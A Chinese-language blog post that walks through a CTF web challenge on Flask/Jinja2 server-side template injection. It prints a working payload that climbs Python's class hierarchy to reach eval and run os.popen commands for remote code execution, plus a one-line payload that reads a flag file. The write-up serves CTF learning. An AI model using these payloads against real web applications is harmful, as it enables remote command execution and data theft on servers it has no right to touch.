---
title: 攻防世界 WEB Web_python_template_injection
categories:
  - ctf
tags:
  - 信息安全
abbrlink: 57753
date: 2020-01-18 13:25:19
---



# 0x00 - 题目描述

![](http://markdown.yeek.top/20200118132746.png)


<!-- MORE -->


# 0x01 - 解题过程

打开是单一网页，注释中也没有其他提示。

![](http://markdown.yeek.top/20200118132924.png)



通过百度得知，是要利用 flask 模板的代码注入漏洞。就例如下面这种

![](http://markdown.yeek.top/20200118133342.png)



这是某大神已经写好的远程执行漏洞，在popen里填入指令就行了。

```php
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}  
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("ls").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

效果如下

![](http://markdown.yeek.top/20200118133907.png)

![](http://markdown.yeek.top/20200118133951.png)





# 0x02 - 技术总结

这道题属于 **SSTI——服务端模板注入攻击** ，其实在 `Chrome` 的 `Hackbar` 中有测试载荷。



**SSTI** 读取文载荷

```python
[].__class__.__base__.__subclasses__()[40]('fl4g').read()
```



